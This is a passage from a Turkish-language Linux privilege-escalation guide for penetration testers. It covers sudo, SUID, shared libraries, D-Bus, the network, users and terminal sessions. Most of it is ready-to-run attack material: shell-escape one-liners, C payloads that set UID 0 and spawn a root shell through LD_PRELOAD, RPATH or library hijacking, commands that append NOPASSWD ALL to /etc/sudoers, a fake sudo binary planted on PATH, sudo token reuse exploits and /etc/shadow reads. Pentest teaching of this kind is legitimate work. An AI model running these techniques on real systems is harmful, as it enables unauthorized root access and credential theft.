```

`socat` bağlantısını kurduktan sonra, kök düzey erişimle ana bilgisayar dosya sistemine doğrudan komutlar yürütebilirsiniz.

### Diğerleri

Docker soketi üzerinde yazma izinleriniz varsa çünkü **`docker` grubu içindesiniz**, [**yetkileri yükseltmek için daha fazla yolunuz olabilir**](interesting-groups-linux-pe/#docker-group). [**Docker API'nin bir portta dinlediği** durumda, onu tehlikeye atabilirsiniz](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Docker'dan kaçmak veya yetkileri yükseltmek için kötüye kullanma yollarını **daha fazla kontrol edin**:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) yetki yükseltme

Eğer **`ctr`** komutunu kullanabildiğinizi fark ederseniz, **yetkileri yükseltmek için kötüye kullanabilir olabilirsiniz**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** yetki yükseltme

Eğer **`runc`** komutunu kullanabildiğinizi fark ederseniz, **yetkileri yükseltmek için kötüye kullanabilir olabilirsiniz**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus, uygulamaların etkili bir şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan sofistike bir **İşlem Arası İletişim (IPC) sistemi**dir. Modern Linux sistemi için tasarlanmış olup, farklı uygulama iletişimi için sağlam bir çerçeve sunar.

Sistem, işlem arası iletişimi destekleyerek, süreçler arasında veri alışverişini artıran temel IPC'yi destekler, gelişmiş UNIX alan soketlerini hatırlatır. Ayrıca, olayları veya sinyalleri yayınlamayı destekler ve sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemonundan gelen bir arama sinyali, bir müzik çaların sessizleşmesine neden olabilir, kullanıcı deneyimini artırır. Ayrıca, D-Bus, hizmet isteklerini ve yöntem çağrılarını basitleştiren bir uzak nesne sistemi destekler, geleneksel olarak karmaşık olan süreçleri basitleştirir.

D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) eşleşen politika kurallarının kümülatif etkisine dayanarak yöneten bir **izin/izin verme modeli** üzerinde çalışır. Bu politikalar, otobüsle etkileşimleri yönetir ve bu izinlerin kötüye kullanılması yoluyla yetki yükseltmesine olanak tanır.

Örneğin, `/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasındaki böyle bir politika, kök kullanıcının `fi.w1.wpa_supplicant1`'e ait mesajları sahiplenme, gönderme ve alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanırken, "varsayılan" bağlam politikaları, diğer belirli politikalarla kapsanmayan tüm uygulamalar için geçerlidir.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini nasıl sıralayıp istismar edeceğinizi öğrenin:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Ağ**

Makinenin konumunu belirlemek için ağın sıralanması her zaman ilginçtir.

### Genel sıralama
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık Portlar

Her zaman, erişim sağlamadan önce etkileşimde bulunamadığınız makinede çalışan ağ hizmetlerini kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafik dinleyip dinleyemediğinizi kontrol edin. Eğer yapabiliyorsanız, bazı kimlik bilgilerini ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Sıralama

Kendi **kimliğinizi**, hangi **yetkilere** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **giriş yapabileceğini** ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT\_MAX** olan kullanıcıların ayrıcalıklarını yükseltmelerine izin veren bir hata ile etkilenmiştir. Daha fazla bilgi için: [buraya](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [buraya](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [buraya](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit etmek** için: **`systemd-run -t /bin/bash`**

### Gruplar

Kök ayrıcalıklarını size sağlayabilecek **bazı grup üyesi** olup olmadığını kontrol edin:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Şifre Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen şifreler

Eğer ortamın **herhangi bir şifresini biliyorsanız**, her bir kullanıcı olarak giriş yapmaya çalışın **şifreyi kullanarak**.

### Su Brute

Eğer çok fazla gürültü yapmaktan çekinmiyorsanız ve bilgisayarda `su` ve `timeout` ikilisi mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıyı brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile de kullanıcıları brute-force etmeye çalışır.

## Yazılabilir PATH kötüye kullanımları

### $PATH

Eğer $PATH'in içindeki bazı klasörlere **yazabileceğinizi** fark ederseniz, **yazılabilir klasörün içine bir arka kapı oluşturarak** ayrı bir kullanıcı (genellikle root) tarafından çalıştırılacak bir komutun adını oluşturarak ayrıcalıkları yükseltebilirsiniz ve bu komut $PATH içindeki yazılabilir klasörünüzden önce yer almayan bir klasörden yüklenmiyor olmalıdır.

### SUDO ve SUID

Belirli bir komutu sudo kullanarak veya suid bitine sahip olabilirsiniz. Bunu kontrol etmek için:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmeyen komutlar dosyaları okumanıza ve/veya yazmanıza hatta komut çalıştırmanıza olanak tanır.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının şifreyi bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte, `demo` kullanıcısı `root` olarak `vim` çalıştırabilir, şimdi bir ssh anahtarı ekleyerek veya `sh` çağırarak bir kabuk almak çok kolaydır.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, bir şeyi yürütürken bir **çevre değişkeni ayarlamayı** sağlar:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB makinesi Admirer**'a dayanarak, betiği kök olarak çalıştırırken keyfi bir python kütüphanesini yüklemek için **PYTHONPATH yönlendirmesine** karşı **savunmasızdı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo yürütme yollarını atlayarak

Diğer dosyalara atlamak veya **sembolik bağlantılar** kullanmak için **atla**. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **joker karakter** (\*) kullanılıyorsa, işler daha da kolaylaşır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID ikili dosyası komut yolu belirtilmeden

Eğer **sudo izni** tek bir komuta **yol belirtilmeden verilmişse**: _hacker10 ALL= (root) less_ PATH değiştirilerek bunu sömürülebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik ayrıca bir **suid** ikili dosyasının **yolunu belirtmeden başka bir komutu çalıştırması durumunda da kullanılabilir (her zaman garip bir SUID ikili dosyasının içeriğini** _**strings**_ **ile kontrol edin)**.

[Çalıştırılacak payload örnekleri.](payloads-to-execute.md)

### Komut yolunu belirten SUID ikili dosya

Eğer **suid** ikili dosyası **yolu belirterek başka bir komutu çalıştırıyorsa**, o zaman, suid dosyanın çağırdığı komut adında bir **fonksiyon ihraç etmeyi deneyebilirsiniz**.

Örneğin, bir suid ikili dosya _**/usr/sbin/service apache2 start**_ çağırıyorsa, bu fonksiyonu oluşturup ihraç etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** çevresel değişkeni, yükleyicinin diğer tüm kütüphanelerden önce, özellikle `libc.so` gibi standart C kütüphanesinden önce yüklenmesi gereken bir veya daha fazla paylaşılan kütüphane (.so dosyaları) belirtmek için kullanılır. Bu işlem, bir kütüphanenin önceden yüklenmesi olarak bilinir.

Ancak, sistem güvenliğini korumak ve özellikle **suid/sgid** yürütülebilir dosyalarla bu özelliğin kötüye kullanılmasını önlemek için sistem belirli koşulları zorlar:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) etkili kullanıcı kimliği (_euid_) ile eşleşmeyen yürütülebilir dosyalarda **LD\_PRELOAD**'u yok sayar.
- Suid/sgid'li yürütülebilir dosyalar için, yalnızca standart yollardaki ve aynı zamanda suid/sgid olan kütüphaneler önceden yüklenir.

Ayrıcalık yükseltmesi, `sudo` ile komutları yürütme yeteneğine sahipseniz ve `sudo -l` çıktısı **env\_keep+=LD\_PRELOAD** ifadesini içeriyorsa meydana gelebilir. Bu yapılandırma, **LD\_PRELOAD** çevresel değişkeninin kalmasına ve komutlar `sudo` ile çalıştırıldığında dahi tanınmasına izin verir, bu da potansiyel olarak yükseltilmiş ayrıcalıklarla keyfi kodun yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** olarak kaydedin.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından **derleyin** ve şunu kullanın:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **ayrıcalıkları yükseltin** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Benzer bir ayrıcalık yükseltme saldırısı, saldırganın kütüphanelerin aranacağı yolunu kontrol ettiği **LD\_LIBRARY\_PATH** çevresel değişkenini kontrol ediyorsa istismar edilebilir.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so enjeksiyonu

**SUID** izinlerine sahip bir ikili dosya ile karşılaşıldığında ve bu dosya olağandışı görünüyorsa, bu dosyanın **.so** dosyalarını düzgün bir şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu kontrol aşağıdaki komut çalıştırılarak yapılabilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, bir zafiyet potansiyelini işaret edebilir.

Bunu sömürmek için, bir C dosyası oluşturarak devam edilir, diyelim ki _"/path/to/.config/libcalc.c"_, aşağıdaki kodu içeren:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra dosya izinlerini manipüle ederek ayrıcalıkları yükseltmeyi ve yükseltilmiş ayrıcalıklarla bir kabuk çalıştırmayı amaçlar.

Yukarıdaki C dosyasını paylaşılan nesne (.so) dosyasına derlemek için:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## Paylaşılan Nesne Kaçırma

Son olarak, etkilenen SUID ikili dosyasını çalıştırmak, potansiyel sistem tehlikesine yol açacak olan saldırıyı tetiklemelidir.
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Şimdi yazma iznimizin olduğu bir klasörden bir kütüphane yükleyen bir SUID ikili bulduğumuza göre, o klasörde gerekli isme sahip kütüphaneyi oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Eğer şu gibi bir hata alırsanız:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Bu, oluşturduğunuz kütüphanenin `a_function_name` adında bir işlev içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), bir saldırganın yerel güvenlik kısıtlamalarını atlamak için kullanabileceği Unix ikililerinin derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/), yalnızca bir komuta argüman enjekte edebileceğiniz durumlar için aynı işlevi görür.

Proje, kısıtlanmış kabuklardan kaçınmak, ayrıcalıkları yükseltmek veya sürdürmek, dosyaları transfer etmek, bağlama ve ters kabuklar oluşturmak ve diğer son aşama saldırı görevlerini kolaylaştırmak için Unix ikililerinin meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l`'ye erişebiliyorsanız, [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanarak herhangi bir sudo kuralını nasıl sömürüleceğini kontrol edebilirsiniz.

### Sudo Token'larını Tekrar Kullanma

**Sudo erişiminiz** var ancak şifreniz yoksa, **bir sudo komutu yürütülmesini bekleyerek ve ardından oturum belirtecinin ele geçirilmesiyle** ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

* Zaten "_sampleuser_" kullanıcısı olarak bir kabuğunuz var
* "_sampleuser_" **son 15 dakika içinde `sudo`** kullanarak bir şeyi yürütmüş (varsayılan olarak, şifre gerektirmeden `sudo` kullanmamıza izin veren sudo belirtecinin süresi budur)
* `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0
* `gdb` erişilebilir durumda (yükleme yapabilmelisiniz)

(Bu gereksinimlerin tümü karşılanıyorsa, **aşağıdaki kullanarak ayrıcalıkları yükseltebilirsiniz:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **İlk saldırı** (`exploit.sh`), `activate_sudo_token` adlı ikili dosyayı _/tmp_ dizininde oluşturacaktır. Bu dosyayı kullanarak **oturumunuzda sudo belirtecini etkinleştirebilirsiniz** (otomatik olarak kök kabuğa geçmeyeceksiniz, `sudo su` komutunu kullanın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **İkinci exploit** (`exploit_v2.sh`) _/tmp_ dizininde **root'a ait ve setuid ile** bir sh shell oluşturacaktır.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Üçüncü saldırı (`exploit_v3.sh`) **sudo yetkilerini sonsuz hale getiren ve tüm kullanıcılara sudo kullanımı izni veren bir sudoers dosyası oluşturacaktır**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Kullanıcı Adı>

Eğer klasörde veya klasör içinde oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) adlı ikili dosyayı kullanarak **bir kullanıcı ve PID için sudo belirteci oluşturabilirsiniz**.\
Örneğin, _/var/run/sudo/ts/örnekkullanıcı_ dosyasını üzerine yazabilir ve PID'si 1234 olan o kullanıcı olarak bir kabuk elde ettiyseniz, şifreyi bilmeden sudo ayrıcalıklarını **elde edebilirsiniz**.
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimin `sudo` kullanabileceğini ve nasıl kullanabileceğini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
Eğer bu dosyayı **okuyabiliyorsanız**, bazı ilginç bilgilere **erişebilirsiniz**, ve eğer herhangi bir dosyayı **yazabilirseniz**, ayrıcalıkları **yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Eğer yazabilirseniz, bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Başka bir yol bu izinleri kötüye kullanmaktır:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` ikamesi için `doas` gibi bazı seçenekler vardır, OpenBSD için yapılandırmasını kontrol etmeyi unutmayın `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Kaçırma

Eğer bir **kullanıcının genellikle bir makineye bağlandığını ve ayrıcalıkları yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcının bağlamında bir kabuk elde ettiyseniz, **kök olarak kodunuzu çalıştıracak yeni bir sudo yürütülebilir dosya oluşturabilirsiniz** ve ardından kullanıcının komutunu çalıştırabilirsiniz. Daha sonra, kullanıcı bağlamının $PATH'ini değiştirin (örneğin, yeni yolu .bash\_profile içine ekleyin), böylece kullanıcı sudo'yu çalıştırdığında, kendi sudo yürütülebilir dosyanız çalıştırılır.

Kullanıcının farklı bir kabuk kullandığını (bash değil) biliyorsanız, yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örnek için [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) adresine bakabilirsiniz.

Veya şunu çalıştırarak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklü yapılandırma dosyalarının nereden geldiğini** belirtir. Genellikle, bu dosya aşağıdaki yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` yolundaki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin aranacağı diğer klasörlere işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Eğer **bir kullanıcının yazma izinleri** `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasındaki herhangi bir klasör üzerinde ise, ayrıcalıkları yükseltebilir.\
Bu yanlış yapılandırmadan **nasıl yararlanılacağına** aşağıdaki sayfada bakın:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`lib`'i `/var/tmp/flag15/` dizinine kopyalayarak, programın bu konumda belirtilen `RPATH` değişkeninde kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Sonra, `/var/tmp` dizininde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutunu kullanarak kötü niyetli bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetenekler

Linux yetenekleri, bir işleme mevcut kök ayrıcalıklarının bir **alt kümesini sağlar**. Bu, kök **ayrıcalıklarını daha küçük ve ayırt edici birimlere** böler. Bu birimlerden her biri daha sonra işlemlere bağımsız olarak verilebilir. Bu şekilde tüm ayrıcalıkların kümesi azaltılarak, sömürü riskleri azaltılır.\
Yetenekler hakkında daha fazla bilgi edinmek için aşağıdaki sayfayı okuyun:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Dizin izinleri

Bir dizinde, **"çalıştır"** biti, etkilenen kullanıcının klasöre "**cd**" yapabileceği anlamına gelir.\
**"Oku"** biti, kullanıcının **dosyaları listeleyebileceği** anlamına gelir ve **"yaz"** biti, kullanıcının **dosya silebileceği** ve **yeni dosya oluşturabileceği** anlamına gelir.

## ACL'ler

Erişim Kontrol Listeleri (ACL'ler), geleneksel ugo/rwx izinlerini **geçersiz kılabilen** ikincil bir keyfi izin katmanını temsil eder. Bu izinler, dosya veya dizin erişimini kontrolü artırarak, sahipleri veya grupta olmayan belirli kullanıcılara belirli hakları verme veya reddetme yeteneğine sahiptir. Bu **aşamalı düzey**, daha hassas erişim yönetimi sağlar. Daha fazla ayrıntıya [**buradan**](https://linuxconfig.org/how-to-manage-acls-on-linux) ulaşılabilir.

Kullanıcı "kali"ye bir dosya üzerinde okuma ve yazma izinleri **verin**:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
Sistemden belirli ACL'ye sahip dosyaları **alın**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık kabuk oturumları

**Eski sürümlerde**, farklı bir kullanıcının (**root**) bazı **kabuk** oturumlarını **ele geçirebilirsiniz**.\
**En yeni sürümlerde**, yalnızca **kendi kullanıcınızın** ekran oturumlarına **bağlanabileceksiniz**. Bununla birlikte, oturum içinde **ilginç bilgiler bulabilirsiniz**.

### Ekran oturumlarını ele geçirme

**Ekran oturumlarını listeleme**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Bir oturuma bağlanma**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux oturumları ele geçirme

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Root tarafından oluşturulan bir tmux (v2.1) oturumunu ayrıcalıklı olmayan bir kullanıcı olarak ele geçiremedim.

**Tmux oturumlarını listeleme**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Bir oturuma bağlanın**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**HTB'den Valentine kutusunu** bir örnek için kontrol edin.

## SSH

### Debian OpenSSL Tahmin Edilebilir PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenebilir.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulduğunda meydana gelir, çünkü **yalnızca 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği anlamına gelir ve **ssh genel anahtarı olan kişi, karşılık gelen özel anahtarı arayabilir**. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

* **PasswordAuthentication:** Parola kimlik doğrulamasının izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
* **PubkeyAuthentication:** Genel anahtar kimlik doğrulamasının izin verilip verilmediğini belirtir. Varsayılan `yes`'tir.
* **PermitEmptyPasswords**: Parola kimlik doğrulamasına izin verildiğinde, sunucunun boş parola dizelerine sahip hesaplara giriş yapmasına izin verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

Root'un ssh kullanarak giriş yapmasına izin verilip verilmediğini belirtir, varsayılan `no`'dur. Olası değerler:

* `yes`: root, parola ve özel anahtar kullanarak giriş yapabilir
* `without-password` veya `prohibit-password`: root, yalnızca özel anahtarla giriş yapabilir
* `forced-commands-only`: Root, yalnızca özel anahtar kullanarak ve komut seçenekleri belirtildiğinde giriş yapabilir
* `no` : hayır

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek genel anahtarları içeren dosyaları belirtir. `%h` gibi belirteçler içerebilir, bu belirteçler ev dizini tarafından değiştirilecektir. **Mutlak yolları** (başlangıç `/`) veya **kullanıcının evinden başlayan** **göreceli yolları** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, "**testusername**" kullanıcısının **özel** anahtarı ile giriş yapmaya çalışırsanız, ssh'nin anahtarınızın genel anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarındaki anahtarlarla karşılaştıracağını belirtecektir.

### ForwardAgent/AllowAgentForwarding

